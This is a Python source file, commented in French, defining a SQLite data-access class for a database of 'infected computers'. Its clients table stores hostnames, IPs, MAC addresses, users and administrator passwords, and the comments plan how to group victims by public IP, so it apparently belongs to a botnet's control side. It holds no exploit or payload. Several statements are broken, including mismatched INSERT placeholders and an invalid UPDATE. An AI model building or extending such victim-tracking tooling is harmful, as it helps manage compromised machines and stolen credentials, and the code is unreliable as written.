#!/usr/bin/env python

__author__ = "Karl Boulais"

import sqlite3

DATABASE = 'DATABASE.db'

# ACTIVER_FK = 'PRAGMA foreign_keys = ON'
# Pas nécessaire à moins de définir une table qui sépare les clients par réseau publique
# On peut penser à une infection qui détermine l'adresse publique pour une étendu réseau privé
#     TABLE IP PUBLIQUE                  TABLE CLIENTS
# --------------------------        -----------------------
# |        Site 1          |        |client 192.168.64.137|
# | pub ip : 104.203.1.2   | -->    |client 192.168.64.138|
# | private: 192.168.64.1  |        |client 192.168.64.139|
# --------------------------        -----------------------
# |        Site 2          |        |client 192.168.64.137|
# | pub ip : 143.202.6.6   | -->    |client 192.168.64.138|
# | private: 192.168.64.1  |        |client 192.168.64.139|
# --------------------------        -----------------------
# Donc on aurait une table ip publique
# Pour chaque ip publique on aurait une table de clients


CREATE_CLIENTS = '''
CREATE TABLE IF NOT EXISTS clients
(
    id              INT PRIMARY KEY NOT NULL, 
    hostname        VARCHAR() NOT NULL,
    ip              VARCHAR(12) NOT NULL,
    mac             VARCHAR(12) NOT NULL,
    users           VARCHAR() NOT NULL,
    adminPass       VARCHAR() NOT NULL
)
'''

DROP_CLIENT   = 'DROP TABLE IF EXISTS clients'
SELECT_CLIENT = 'SELECT * FROM clients'
INSERT_CLIENT = 'INSERT INTO clients VALUES(?, ?, ?, ?, ?)'

# FIXME: Pas certain comment mettre à jour une des cinqs informations pour un client spécifique
UPDATE_CLIENT = 'UPDATE clients SET VALUES(?, ?, ?, ?, ?) WHERE id = ?'

class Dao():
    """ Base de donnée contenant les informations des ordinnateurs infectés """
    def __init__(self):
        self.db = DATABASE
        self.cursor = None

    def connect(self, db: str):
        self.connection  = sqlite3.connect(db)
        self.cursor      = self.connection.cursor()

    def disconnect(self):
        self.cursor.close()
        self.connection.close()

    def createDb(self, cursor: object):
        self.cursor.execute(DROP_CLIENT)
        self.cursor.execute(CREATE_CLIENTS)

    def insertManyClients(self,data: tuple):
        self.cursor.executemany(INSERT_CLIENT, data)
        self.connection.commit()
    
    def insertClient(self,data: tuple):
        self.cursor.execute(INSERT_CLIENT, data)
        self.connection.commit()

    # TODO: Cette fonction ne va pas ici
    def bufferInsert(self, data: tuple):
        buffer = list
        buffer.append(data)
        if (len(buffer) > 5): #TODO: Ajouter une contrainte de temps pour flusher le buffer # Fifo
            self.insertClient(buffer)

        
    
if __name__ == "__main__":
    pass


